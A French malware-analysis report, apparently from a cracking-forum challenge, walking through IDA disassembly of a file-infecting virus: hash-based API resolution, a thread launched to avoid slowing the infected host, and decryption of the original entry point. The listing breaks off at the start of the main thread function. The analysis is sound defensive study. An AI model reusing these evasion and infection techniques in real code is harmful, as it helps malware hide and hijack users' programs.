<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr">
<head>
<title>Rapport d'analyse pour le BugTraq#1 de ForumCrack par Kharneth</title>

	<link href="Asm.css" rel="stylesheet" type="text/css" />
	<link href="Style.css" rel="stylesheet" type="text/css" />

</head>
<body>

<div class="Sommaire"><a href="Index.html">Retour au sommaire</a></div>

<div class="Titre">V. Analyse du Virus</div>
<div class="Auteur">par Kharneth</div>

				<ol>
<a name="Apifrom"></a>			
						<li><span class="TitreSSChap">GetApiFromCRC</span>
								<p>Après avoir chargé le fichier décompressé dans IDA (<i>en laissant les options par défaut</i>), voilà ce que nous voyons à l'EntryPoint :</p>
								<div class="border" id="border">
								<span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401000</span> CryptedOEP &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S9">dd</span> <span class="S2">0</span><br />				
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401004</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401004</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S9">public</span> <span class="S9">start</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401004</span> <span class="S9">start</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S9">proc</span> <span class="S10">near</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401004</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401004</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">0</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; int</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401006</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">0</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; int</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401008</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S10">dword</span> <span class="S9">ptr</span> <span class="S4">[</span><span class="S8">esp</span><span class="S4">],</span> <span class="S12">'LDTN'</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040100F</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S10">dword</span> <span class="S9">ptr</span> <span class="S4">[</span><span class="S8">esp</span><span class="S4">+</span><span class="S2">4</span><span class="S4">],</span> <span class="S12">'L'</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401017</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S8">esp</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; int</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401018</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">0</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; DLL</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040101A</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">3FC1BD8Dh</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; LoadLibraryA</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040101F</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">call</span> &nbsp;&nbsp;&nbsp;GetApiFromCRC<br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401024</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">call</span> &nbsp;&nbsp;&nbsp;<span class="S8">eax</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401026</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">add</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">esp</span><span class="S4">,</span> <span class="S2">8</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Supprime la chaine "NTDLL" précédemment placée dans la pile</span><br />
								</span>
								</div>
								<p>Avant d'aller plus loin, je vais expliquer la fonction <b>GetApiFromCRC</b>. En effet, toutes les adresses des apis utilisées dans le programme sont résolues dynamiquement juste avant d'être appelées.</p>
								<p>Voici la définition de la fonction :<br /><br />
								<span class="S10">DWORD</span> <b>GetApiFromCRC(</b><span class="S10">DWORD</span> CRC<b>,</b> <span class="S10">DWORD</span> Dll<b>);</b></p>
								<p>Le premier argument (<i>CRC</i>) est un hash 32 bits du nom de l'api. Le deuxième argument est l'ImageBase de la dll dans laquelle se trouve l'api ou 0 pour Kernel32.</p>
								<p>Voici comment est appelée une api dans le programme :<br />
								<ul>
										<li>Place les arguments de l'api sur la pile - (<i>dans l'exemple ci-dessus : <span class="S6">push</span> <span class="S8">esp</span></i>)</li>
										<li>Précise à quelle dll appartient l'api - (<i><span class="S6">push</span> <span class="S2">0</span> <span class="S1">; Kernel32</span></i>)</li>
										<li>Passe le Hash32 du nom de l'api - (<i><span class="S6">push</span> <span class="S2">3FC1BD8Dh</span></i>)</li>
										<li>Retrouve l'adresse de l'api (<i>retournée dans <span class="S8">eax</span></i>) à partir de son Hash - (<i><span class="S6">call</span> GetApiFromCRC</i>)</li>
										<li>Appelle l'api - (<i><span class="S6">call</span> <span class="S8">eax</span></i>)</li>
								</ul>								
								</p>		
								<p>Je ne vais pas détailler le code de cette fonction car Neitsa a déjà écrit <a target="blank" href="http://neitsabes.free.fr/RE/HIRE/OwnGetProc1.html">un article en 3 parties</a> expliquant son fonctionnement (<i>Il est identique si ce n'est qu'il travaille sur des Hash au lieu de chaines de caractères</i>).</p>
								<p>Pour faciliter l'analyse, j'ai codé un petit programme qui me renvoit le nom de l'api en lui donnant un Hash (<a href="Sources\GetCRCApiName">GetCRCApiName dans le dossier Sources</a>). J'ai simplement copié le code des fonctions de IDA dans MASM.</p>						
						</li>
<a name="EPProc"></a>	<div class="SommaireR"><a href="Index.html">Retour au sommaire</a></div>		
	 					<li><span class="TitreSSChap">Procédure à l'EntryPoint</span>
								<p>Nous avons vu dans le 1<sup>er</sup> chapitre le fonctionnement des appels des apis. Je ne vais pas recopier le code qui récupère simplement l'ImageBase de NTDLL en appelant <b><i>LoadLibraryA</i></b>.</p>
								<div class="border" id="border">
								<span>
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401029</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">ebx</span><span class="S4">,</span> <span class="S8">eax</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040102B</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S4">[</span><span class="S8">esp</span><span class="S4">+</span><span class="S2">38h</span><span class="S4">],</span> <span class="S8">eax</span> &nbsp;<span class="S1">; Sauvegarde hNTDLL dans le premier DWORD de la pile</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040102F</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">call</span> &nbsp;&nbsp;&nbsp;<span class="S10">$</span><span class="S4">+</span><span class="S2">5</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401034</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">pop</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; eax = 00401034</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401035</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S4">[</span><span class="S8">eax</span><span class="S4">-</span><span class="S2">34h</span><span class="S4">]</span> &nbsp;<span class="S1">; CryptedOEP</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401038</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">or</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S8">eax</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; eax = 0</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040103A</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">jz</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S9">short</span> FirstExecution<br />
								<span>
								</div>
								<p>Ensuite, cette valeur est sauvegardée dans le premier DWORD de la pile (<i>Sous <acronym title="Systèmes à base NT : 2000, XP">NT</acronym>, à l'EntryPoint d'un programme, <span class="S4">[</span><span class="S8">esp</span><span class="S4">+</span><span class="S2">38h</span><span class="S4">]</span> est le 1<sup>er</sup> DWORD de la pile</i>). 
								 Puis le programme teste la présence d'une valeur en </span><span class="S2">00401000</span>. On verra plus tard que cette valeur correspond à l'EntryPoint du programme infecté.
								 Si cette valeur est nulle, le programme n'est pas dans un fichier infecté et s'exécute donc pour la première fois. Cela ne va pas changer grand chose à la suite. La seule différence est que l'exécution va continuer soit normalement, soit dans un nouveau thread.
								</p>												
								<div class="border" id="border">
								<span>							
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040103C</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S8">eax</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Sauvegarde l'OEP crypté</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040103D</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">call</span> &nbsp;&nbsp;&nbsp;<span class="S10">$</span><span class="S4">+</span><span class="S2">5</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401042</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">pop</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; eax = 00401042</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401043</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">add</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S2">30h</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; eax = 00401072</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401046</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">0</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; lpThreadId</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401048</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">0</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; dwCreationFlags</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040104A</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S8">ebx</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; lpParameter = hNTDLL</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040104B</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S8">eax</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; lpStartAddress = 00401072</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040104C</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">10000h</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; dwStackSize</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401051</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">0</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; lpThreadAttributes</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401053</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">0</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; hKernel32</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401055</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">906A06B0h</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; CreateThread</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040105A</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">call</span> &nbsp;&nbsp;&nbsp;GetApiFromCRC<br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040105F</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">call</span> &nbsp;&nbsp;&nbsp;<span class="S8">eax</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040105F</span> DecryptOEP:<br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401061</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">pop</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Récupère l'OEP crypté</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401062</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">rol</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S2">0Ah</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Decrypt OEP</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401065</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">bswap</span> &nbsp;&nbsp;<span class="S8">eax</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401067</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">jmp</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Saute vers l'OEP du fichier infecté</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401069</span> <span class="S1">; ---------------------------------------------------------------------------</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401069</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">jmp</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S9">short</span> Quit<br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040106B</span> <span class="S1">; ---------------------------------------------------------------------------</span><br />
								<span>
								</div>
								<p>Si le virus se trouve dans un fichier infecté, il lance un nouveau Thread pour éviter de ralentir le chargement du programme et ainsi, prévenir l'utilisateur d'un problème.
								Puis il décrypte l'<acronym title="Original Entry Point">OEP</acronym> avant de s'y rendre.</p>
								
								<div class="border" id="border">
								<span>								
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040106B</span> <br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040106B</span> FirstExecution<span class="S4">:</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; CODE XREF: start+36</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040106B</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S8">eax</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Push 0</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040106C</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">call</span> &nbsp;&nbsp;&nbsp;Thread<br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401071</span> <br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401071</span> Quit<span class="S4">:</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; CODE XREF: start+65</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401071</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">retn</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401071</span> <span class="S9">start</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S9">endp</span> <br />
								</span>						
								</div>
								<p>Si le virus ne se trouve pas dans un exe infecté, il appelle simplement la même procédure que pour le Thread.</p>
						</li>
<a name="Thread"></a>	<div class="SommaireR"><a href="Index.html">Retour au sommaire</a></div>	
	 					<li><span class="TitreSSChap">Fonction principale du Thread</span>
								<p>On sait que cette fonction prend un paramètre, 0 en cas de première exécution ou l'ImageBase de NTDLL si le fichier est infecté. Donc on va commencer par définir les propriétés de la fonction.</p>
								<p class="Ida"><img src="Images/Ida.png" alt="Ida" />On renomme d'abord la fonction en <b>Thread</b> en cliquant sur son adresse (<span class="S2">00401051</span>) puis en tapant <b>N</b>. Puis <b>Y</b> pour définir son type. Un message vous demande de préciser un compilateur avant. Ce que l'on fait en allant dans <b>Options</b> --> <b>Compiler...</b>, Là on choisie par exemple <b>Visual C++</b> puis OK.<br />
								On rappuie sur la touche <b>Y</b> (<i>toujours à l'adresse de la fonction</i>), et IDA nous donne la déclaration suivante : <b>int __stdcall Thread(int);</b>. On nomme l'argument pour obtenir <b>int __stdcall Thread(int argNTDLL);</b> et le listing se modifie pour afficher ce nouveau nom.
								</p>
								<p>Examinons le début de cette fonction :</p>
								<div class="border" id="border">
								<span><span class="S10">.text</span><span class="S4">:</span><span class="S2">00401072</span> <span class="S1">; int __stdcall Thread(int ArgNTDLL)</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401072</span> Thread &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S9">proc</span> <span class="S10">near</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; CODE XREF: start+68</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401072</span> <br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401072</span> DeviceMapInfo &nbsp;&nbsp;<span class="S4">=</span> PROCESS_DEVICEMAP_INFORMATION <span class="S9">ptr</span> <span class="S4">-</span><span class="S2">30h</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401072</span> lpPath &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S4">=</span> <span class="S10">dword</span> <span class="S9">ptr</span> <span class="S4">-</span><span class="S2">8</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401072</span> hNTDLL &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S4">=</span> <span class="S10">dword</span> <span class="S9">ptr</span> <span class="S4">-</span><span class="S2">4</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401072</span> ArgNTDLL &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S4">=</span> <span class="S10">dword</span> <span class="S9">ptr</span> &nbsp;<span class="S2">8</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401072</span> <br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401072</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S8">ebp</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401073</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">ebp</span><span class="S4">,</span> <span class="S8">esp</span><br />
